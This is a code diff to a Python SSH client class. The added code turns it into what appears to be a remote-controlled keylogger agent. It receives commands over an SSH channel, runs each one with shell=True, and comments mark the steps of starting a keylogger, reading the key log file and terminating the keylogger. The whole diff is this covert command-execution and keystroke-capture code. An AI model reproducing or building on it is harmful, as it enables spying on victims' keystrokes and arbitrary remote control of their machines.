@@ -126,6 +126,7 @@ class sshClient(object):
             logger.info("Calling invoke shell")
             logger.info("Invoke shell called")
 
+            # keylog start
             command = self.channel.recv(1024).decode()
             logger.info(f"Received message {command}")
             p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
@@ -135,10 +136,26 @@ class sshClient(object):
             self.channel.sendall(command.encode())
 
             logger.info("Sleeping . . . ")
-            #time.sleep(10)
+            time.sleep(10)
             logger.info("Awake!")
+
+            # read key log file
             command = self.channel.recv(1024).decode()
             logger.info(f"Received 2nd message {command}")
+            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+
+            print(f"popen communicate{p.communicate()}")
+            self.channel.sendall(command.encode())
+            time.sleep(1)
+
+            # terminate keylogger
+            command = self.channel.recv(1024).decode()
+            logger.info(f"Received 2nd message {command}")
+            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+
+            print(f"popen communicate{p.communicate()}")
+            self.channel.sendall(command.encode())
+
 
             self.channel.close()
             self.ssh.close()
